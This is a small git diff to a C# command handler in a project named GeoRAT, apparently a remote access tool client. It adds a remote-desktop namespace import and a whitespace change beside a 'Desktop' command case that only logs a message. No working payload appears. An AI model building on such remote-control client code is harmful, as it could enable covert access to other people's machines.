@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
+using GeoRAT.Client.Network.RemoteDesktop;
 using GeoRAT.Core.Commands;
 
 
@@ -35,7 +36,7 @@ namespace GeoRAT.Client.CommandHandlers
                     break;
                 case "Desktop":
                     Console.WriteLine("Remote desktop command received, sending desktop");
-                  
+
                     break;
 
             }
